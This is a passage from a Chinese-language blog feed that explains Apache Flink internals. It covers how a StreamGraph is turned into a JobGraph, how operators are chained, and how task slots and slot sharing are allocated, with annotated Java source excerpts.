否则先创建一个空的 StreamConfig&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// createJobVertex 函数就是根据 StreamNode 创建对应的 JobVertex, 并返回了空的 StreamConfig&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    StreamConfig config = currentNodeId.equals(startNodeId)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ? createJobVertex(startNodeId, hashes)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        : &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StreamConfig(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Configuration());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 设置 JobVertex 的 StreamConfig, 基本上是序列化 StreamNode 中的配置到 StreamConfig 中.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 其中包括 序列化器, StreamOperator, Checkpoint 等相关配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setVertexConfig(currentNodeId, config, chainableOutputs, nonChainableOutputs);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (currentNodeId.equals(startNodeId)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 如果是chain的起始节点。（不是chain中的节点，也会被标记成 chain start）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      config.setChainStart();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 我们也会把物理出边写入配置, 部署时会用到&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      config.setOutEdgesInOrder(transitiveOutEdges);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      config.setOutEdges(streamGraph.getStreamNode(currentNodeId).getOutEdges());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 将当前节点(headOfChain)与所有出边相连&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (StreamEdge edge : transitiveOutEdges) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// 通过StreamEdge构建出JobEdge，创建IntermediateDataSet，用来将JobVertex和JobEdge相连&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        connect(startNodeId, edge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 将chain中所有子节点的StreamConfig写入到 headOfChain 节点的 CHAINED_TASK_CONFIG 配置中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      config.setTransitiveChainedTaskConfigs(chainedConfigs.get(startNodeId));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 如果是 chain 中的子节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      Map&amp;lt;Integer, StreamConfig&amp;gt; chainedConfs = chainedConfigs.get(startNodeId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (chainedConfs == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        chainedConfigs.put(startNodeId, &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; HashMap&amp;lt;Integer, StreamConfig&amp;gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 将当前节点的StreamConfig添加到该chain的config集合中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      chainedConfigs.get(startNodeId).put(currentNodeId, config);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 返回连往chain外部的出边集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; transitiveOutEdges;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每个 JobVertex 都会对应一个可序列化的 StreamConfig, 用来发送给 JobManager 和 TaskManager。最后在 TaskManager 中起 Task 时,需要从这里面反序列化出所需要的配置信息, 其中就包括了含有用户代码的StreamOperator。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;setChaining&lt;/code&gt;会对source调用&lt;code&gt;createChain&lt;/code&gt;方法，该方法会递归调用下游节点，从而构建出node chains。&lt;code&gt;createChain&lt;/code&gt;会分析当前节点的出边，根据&lt;a href=&quot;http://wuchong.me/blog/2016/05/09/flink-internals-understanding-execution-resources/#Operator-Chains&quot;&gt;Operator Chains&lt;/a&gt;中的chainable条件，将出边分成chainalbe和noChainable两类，并分别递归调用自身方法。之后会将StreamNode中的配置信息序列化到StreamConfig中。如果当前不是chain中的子节点，则会构建 JobVertex 和 JobEdge相连。如果是chain中的子节点，则会将StreamConfig添加到该chain的config集合中。一个node chains，除了 headOfChain node会生成对应的 JobVertex，其余的nodes都是以序列化的形式写入到StreamConfig中，并保存到headOfChain的 &lt;code&gt;CHAINED_TASK_CONFIG&lt;/code&gt; 配置项中。直到部署时，才会取出并生成对应的ChainOperators，具体过程请见&lt;a href=&quot;http://wuchong.me/blog/2016/05/09/flink-internals-understanding-execution-resources/#Operator-Chains&quot;&gt;理解 Operator Chains&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文主要对 Flink 中将 StreamGraph 转变成 JobGraph 的核心源码进行了分析。思想还是很简单的，StreamNode 转成 JobVertex，StreamEdge 转成 JobEdge，JobEdge 和 JobVertex 之间创建 IntermediateDataSet 来连接。关键点在于将多个 SteamNode chain 成一个 JobVertex的过程，这部分源码比较绕，有兴趣的同学可以结合源码单步调试分析。下一章将会介绍 JobGraph 提交到 JobManager 后是如何转换成分布式化的 ExecutionGraph 的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;继前文&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/&quot;&gt;Flink 原理与实现：架构和拓扑概览&lt;/a&gt;中介绍了Flink的四层执行图模型，本文将主要介绍 Flink 是如何将 StreamGraph 转换成 JobGraph 的。根据用户用Stream API编写的程序，构造出一个代表拓扑结构的StreamGraph的。以 WordCount 为例，转换图如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1DzYXJFXXXXXJXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;StreamGraph 和 JobGraph 都是在 Client 端生成的，也就是说我们可以在 IDE 中通过断点调试观察 StreamGraph 和 JobGraph 的生成过程。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="源码分析" scheme="http://wuchong.me/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：理解 Flink 中的计算资源</title>
    <link href="http://wuchong.me/blog/2016/05/09/flink-internals-understanding-execution-resources/"/>
    <id>http://wuchong.me/blog/2016/05/09/flink-internals-understanding-execution-resources/</id>
    <published>2016-05-09T09:19:31.000Z</published>
    <updated>2016-05-09T11:33:00.000Z</updated>
    
    <content type="html">&lt;p&gt;本文所讨论的计算资源是指用来执行 Task 的资源，是一个逻辑概念。本文会介绍 Flink 计算资源相关的一些核心概念，如：Slot、SlotSharingGroup、CoLocationGroup、Chain等。并会着重讨论 Flink 如何对计算资源进行管理和隔离，如何将计算资源利用率最大化等等。理解 Flink 中的计算资源对于理解 Job 如何在集群中运行的有很大的帮助，也有利于我们更透彻地理解 Flink 原理，更快速地定位问题。&lt;/p&gt;
&lt;h2 id=&quot;Operator-Chains&quot;&gt;&lt;a href=&quot;#Operator-Chains&quot; class=&quot;headerlink&quot; title=&quot;Operator Chains&quot;&gt;&lt;/a&gt;Operator Chains&lt;/h2&gt;&lt;p&gt;为了更高效地分布式执行，Flink会尽可能地将operator的subtask链接（chain）在一起形成task。每个task在一个线程中执行。将operators链接成task是非常有效的优化：它能减少线程之间的切换，减少消息的序列化/反序列化，减少数据在缓冲区的交换，减少了延迟的同时提高整体的吞吐量。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我们仍以经典的 WordCount 为例（参考&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/#Job-例子&quot;&gt;前文Job例子&lt;/a&gt;），下面这幅图，展示了Source并行度为1，FlatMap、KeyAggregation、Sink并行度均为2，最终以5个并行的线程来执行的优化过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB18Gv5JFXXXXcDXXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图中将KeyAggregation和Sink两个operator进行了合并，因为这两个合并后并不会改变整体的拓扑结构。但是，并不是任意两个 operator 就能 chain 一起的。其条件还是很苛刻的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;上下游的并行度一致&lt;/li&gt;
&lt;li&gt;下游节点的入度为1 （也就是说下游节点没有来自其他节点的输入）&lt;/li&gt;
&lt;li&gt;上下游节点都在同一个 slot group 中（下面会解释 slot group）&lt;/li&gt;
&lt;li&gt;下游节点的 chain 策略为 ALWAYS（可以与上下游链接，map、flatmap、filter等默认是ALWAYS）&lt;/li&gt;
&lt;li&gt;上游节点的 chain 策略为 ALWAYS 或 HEAD（只能与下游链接，不能与上游链接，Source默认是HEAD）&lt;/li&gt;
&lt;li&gt;两个节点间数据分区方式是 forward（参考&lt;a href=&quot;#&quot;&gt;理解数据流的分区&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;用户没有禁用 chain&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Operator chain的行为可以通过编程API中进行指定。可以通过在DataStream的operator后面（如&lt;code&gt;someStream.map(..)&lt;/code&gt;)调用&lt;code&gt;startNewChain()&lt;/code&gt;来指示从该operator开始一个新的chain（与前面截断，不会被chain到前面）。或者调用&lt;code&gt;disableChaining()&lt;/code&gt;来指示该operator不参与chaining（不会与前后的operator chain一起）。在底层，这两个方法都是通过调整operator的 chain 策略（HEAD、NEVER）来实现的。另外，也可以通过调用&lt;code&gt;StreamExecutionEnvironment.disableOperatorChaining()&lt;/code&gt;来全局禁用chaining。&lt;/p&gt;
&lt;h3 id=&quot;原理与实现&quot;&gt;&lt;a href=&quot;#原理与实现&quot; class=&quot;headerlink&quot; title=&quot;原理与实现&quot;&gt;&lt;/a&gt;原理与实现&lt;/h3&gt;&lt;p&gt;那么 Flink 是如何将多个 operators chain在一起的呢？chain在一起的operators是如何作为一个整体被执行的呢？它们之间的数据流又是如何避免了序列化/反序列化以及网络传输的呢？下图展示了operators chain的内部实现：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1cFbJJFXXXXaIXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上图所示，Flink内部是通过&lt;code&gt;OperatorChain&lt;/code&gt;这个类来将多个operator链在一起形成一个新的operator。&lt;code&gt;OperatorChain&lt;/code&gt;形成的框框就像一个黑盒，Flink 无需知道黑盒中有多少个ChainOperator、数据在chain内部是怎么流动的，只需要将input数据交给 HeadOperator 就可以了，这就使得&lt;code&gt;OperatorChain&lt;/code&gt;在行为上与普通的operator无差别，上面的OperaotrChain就可以看做是一个入度为1，出度为2的operator。所以在实现中，对外可见的只有HeadOperator，以及与外部连通的实线输出，这些输出对应了JobGraph中的JobEdge，在底层通过&lt;code&gt;RecordWriterOutput&lt;/code&gt;来实现。另外，框中的虚线是operator chain内部的数据流，这个流内的数据不会经过序列化/反序列化、网络传输，而是直接将消息对象传递给下游的 ChainOperator 处理，这是性能提升的关键点，在底层是通过 &lt;code&gt;ChainingOutput&lt;/code&gt; 实现的，源码如下方所示，&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：HeadOperator和ChainOperator并不是具体的数据结构，前者指代chain中的第一个operator，后者指代chain中其余的operator，它们实际上都是&lt;code&gt;StreamOperator&lt;/code&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ChainingOutput&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;T&lt;/span&gt;&amp;gt; &lt;span class=&quot;keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Output&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;StreamRecord&lt;/span&gt;&amp;lt;&lt;span class=&quot;title&quot;&gt;T&lt;/span&gt;&amp;gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 注册的下游operator&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; OneInputStreamOperator&amp;lt;T, ?&amp;gt; operator;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ChainingOutput&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(OneInputStreamOperator&amp;lt;T, ?&amp;gt; operator)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.operator = operator;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 发送消息方法的实现，直接将消息对象传递给operator处理，不经过序列化/反序列化、网络传输&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;collect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(StreamRecord&amp;lt;T&amp;gt; record)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      operator.setKeyContextElement1(record);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 下游operator直接处理消息对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      operator.processElement(record);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ExceptionInChainedOperatorException(e);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Task-Slot&quot;&gt;&lt;a href=&quot;#Task-Slot&quot; class=&quot;headerlink&quot; title=&quot;Task Slot&quot;&gt;&lt;/a&gt;Task Slot&lt;/h2&gt;&lt;p&gt;在&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/&quot;&gt;架构概览&lt;/a&gt;中我们介绍了 TaskManager 是一个 JVM 进程，并会以独立的线程来执行一个task或多个subtask。为了控制一个 TaskManager 能接受多少个 task，Flink 提出了 &lt;em&gt;Task Slot&lt;/em&gt; 的概念。&lt;/p&gt;
&lt;p&gt;Flink 中的计算资源通过 &lt;em&gt;Task Slot&lt;/em&gt; 来定义。每个 task slot 代表了 TaskManager 的一个固定大小的资源子集。例如，一个拥有3个slot的 TaskManager，会将其管理的内存平均分成三分分给各个 slot。将资源 slot 化意味着来自不同job的task不会为了内存而竞争，而是每个task都拥有一定数量的内存储备。需要注意的是，这里不会涉及到CPU的隔离，slot目前仅仅用来隔离task的内存。&lt;/p&gt;
&lt;p&gt;通过调整 task slot 的数量，用户可以定义task之间是如何相互隔离的。每个 TaskManager 有一个slot，也就意味着每个task运行在独立的 JVM 中。每个 TaskManager 有多个slot的话，也就是说多个task运行在同一个JVM中。而在同一个JVM进程中的task，可以共享TCP连接（基于多路复用）和心跳消息，可以减少数据的网络传输。也能共享一些数据结构，一定程度上减少了每个task的消耗。&lt;/p&gt;
&lt;p&gt;每一个 TaskManager 会拥有一个或多个的 task slot，每个 slot 都能跑由多个连续 task 组成的一个 pipeline，比如 MapFunction 的第n个并行实例和 ReduceFunction 的第n个并行实例可以组成一个 pipeline。&lt;/p&gt;
&lt;p&gt;如上文所述的 WordCount 例子，5个Task可能会在TaskManager的slots中如下图分布，2个TaskManager，每个有3个slot：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1Q4zUJFXXXXXnXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;SlotSharingGroup-与-CoLocationGroup&quot;&gt;&lt;a href=&quot;#SlotSharingGroup-与-CoLocationGroup&quot; class=&quot;headerlink&quot; title=&quot;SlotSharingGroup 与 CoLocationGroup&quot;&gt;&lt;/a&gt;SlotSharingGroup 与 CoLocationGroup&lt;/h2&gt;&lt;p&gt;默认情况下，Flink 允许subtasks共享slot，条件是它们都来自同一个Job的不同task的subtask。结果可能一个slot持有该job的整个pipeline。允许slot共享有以下两点好处：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Flink 集群所需的task slots数与job中最高的并行度一致。也就是说我们不需要再去计算一个程序总共会起多少个task了。&lt;/li&gt;
&lt;li&gt;更容易获得更充分的资源利用。如果没有slot共享，那么非密集型操作source/flatmap就会占用同密集型操作 keyAggregation/sink 一样多的资源。如果有slot共享，将基线的2个并行度增加到6个，能充分利用slot资源，同时保证每个TaskManager能平均分配到重的subtasks。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1VTj4JFXXXXX8XFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们将 WordCount 的并行度从之前的2个增加到6个（Source并行度仍为1），并开启slot共享（所有operator都在default共享组），将得到如上图所示的slot分布图。首先，我们不用去计算这个job会其多少个task，总之该任务最终会占用6个slots（最高并行度为6）。其次，我们可以看到密集型操作 keyAggregation/sink 被平均地分配到各个 TaskManager。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SlotSharingGroup&lt;/code&gt;是Flink中用来实现slot共享的类，它尽可能地让subtasks共享一个slot。相应的，还有一个 &lt;code&gt;CoLocationGroup&lt;/code&gt; 类用来强制将 subtasks 放到同一个 slot 中。&lt;code&gt;CoLocationGroup&lt;/code&gt;主要用于&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/apis/streaming/index.html#iterations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;迭代流&lt;/a&gt;中，用来保证迭代头与迭代尾的第i个subtask能被调度到同一个TaskManager上。这里我们不会详细讨论&lt;code&gt;CoLocationGroup&lt;/code&gt;的实现细节。&lt;/p&gt;
&lt;p&gt;怎么判断operator属于哪个 slot 共享组呢？默认情况下，所有的operator都属于默认的共享组&lt;code&gt;default&lt;/code&gt;，也就是说默认情况下所有的operator都是可以共享一个slot的。而当所有input operators具有相同的slot共享组时，该operator会继承这个共享组。最后，为了防止不合理的共享，用户也能通过API来强制指定operator的共享组，比如：&lt;code&gt;someStream.filter(...).slotSharingGroup(&amp;quot;group1&amp;quot;);&lt;/code&gt;就强制指定了filter的slot共享组为&lt;code&gt;group1&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;原理与实现-1&quot;&gt;&lt;a href=&quot;#原理与实现-1&quot; class=&quot;headerlink&quot; title=&quot;原理与实现&quot;&gt;&lt;/a&gt;原理与实现&lt;/h3&gt;&lt;p&gt;那么多个tasks（或者说operators）是如何共享slot的呢？&lt;/p&gt;
&lt;p&gt;我们先来看一下用来定义计算资源的slot的类图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1NxjUJFXXXXXoaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;抽象类&lt;code&gt;Slot&lt;/code&gt;定义了该槽位属于哪个TaskManager（&lt;code&gt;instance&lt;/code&gt;）的第几个槽位（&lt;code&gt;slotNumber&lt;/code&gt;），属于哪个Job（&lt;code&gt;jobID&lt;/code&gt;）等信息。最简单的情况下，一个slot只持有一个task，也就是&lt;code&gt;SimpleSlot&lt;/code&gt;的实现。复杂点的情况，一个slot能共享给多个task使用，也就是&lt;code&gt;SharedSlot&lt;/code&gt;的实现。SharedSlot能包含其他的SharedSlot，也能包含SimpleSlot。所以一个SharedSlot能定义出一棵slots树。&lt;/p&gt;
&lt;p&gt;接下来我们来看看 Flink 为subtask分配slot的过程。关于Flink调度，有两个非常重要的原则我们必须知道：（1）同一个operator的各个subtask是不能呆在同一个SharedSlot中的，例如&lt;code&gt;FlatMap[1]&lt;/code&gt;和&lt;code&gt;FlatMap[2]&lt;/code&gt;是不能在同一个SharedSlot中的。（2）Flink是按照拓扑顺序从Source一个个调度到Sink的。例如WordCount（Source并行度为1，其他并行度为2），那么调度的顺序依次是：&lt;code&gt;Source&lt;/code&gt; -&amp;gt; &lt;code&gt;FlatMap[1]&lt;/code&gt; -&amp;gt; &lt;code&gt;FlatMap[2]&lt;/code&gt; -&amp;gt; &lt;code&gt;KeyAgg-&amp;gt;Sink[1]&lt;/code&gt; -&amp;gt; &lt;code&gt;KeyAgg-&amp;gt;Sink[2]&lt;/code&gt;。假设现在有2个TaskManager，每个只有1个slot（为简化问题），那么分配slot的过程如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1TM_3JFXXXXb8XVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：图中 SharedSlot 与 SimpleSlot 后带的括号中的数字代表槽位号（slotNumber）&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;为&lt;code&gt;Source&lt;/code&gt;分配slot。首先，我们从TaskManager1中分配出一个SharedSlot。并从SharedSlot中为&lt;code&gt;Source&lt;/code&gt;分配出一个SimpleSlot。如上图中的①和②。&lt;/li&gt;
&lt;li&gt;为&lt;code&gt;FlatMap[1]&lt;/code&gt;分配slot。目前已经有一个SharedSlot，则从该SharedSlot中分配出一个SimpleSlot用来部署&lt;code&gt;FlatMap[1]&lt;/code&gt;。如上图中的③。&lt;/li&gt;
&lt;li&gt;为&lt;code&gt;FlatMap[2]&lt;/code&gt;分配slot。由于TaskManager1的SharedSlot中已经有同operator的&lt;code&gt;FlatMap[1]&lt;/code&gt;了，我们只能分配到其他SharedSlot中去。从TaskManager2中分配出一个SharedSlot，并从该SharedSlot中为&lt;code&gt;FlatMap[2]&lt;/code&gt;分配出一个SimpleSlot。如上图的④和⑤。&lt;/li&gt;
&lt;li&gt;为&lt;code&gt;Key-&amp;gt;Sink[1]&lt;/code&gt;分配slot。目前两个SharedSlot都符合条件，从TaskManager1的SharedSlot中分配出一个SimpleSlot用来部署&lt;code&gt;Key-&amp;gt;Sink[1]&lt;/code&gt;。如上图中的⑥。&lt;/li&gt;
&lt;li&gt;为&lt;code&gt;Key-&amp;gt;Sink[2]&lt;/code&gt;分配slot。TaskManager1的SharedSlot中已经有同operator的&lt;code&gt;Key-&amp;gt;Sink[1]&lt;/code&gt;了，则只能选择另一个SharedSlot中分配出一个SimpleSlot用来部署&lt;code&gt;Key-&amp;gt;Sink[2]&lt;/code&gt;。如上图中的⑦。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后&lt;code&gt;Source&lt;/code&gt;、&lt;code&gt;FlatMap[1]&lt;/code&gt;、&lt;code&gt;Key-&amp;gt;Sink[1]&lt;/code&gt;这些subtask都会部署到TaskManager1的唯一一个slot中，并启动对应的线程。&lt;code&gt;FlatMap[2]&lt;/code&gt;、&lt;code&gt;Key-&amp;gt;Sink[2]&lt;/code&gt;这些subtask都会被部署到TaskManager2的唯一一个slot中，并启动对应的线程。从而实现了slot共享。&lt;/p&gt;
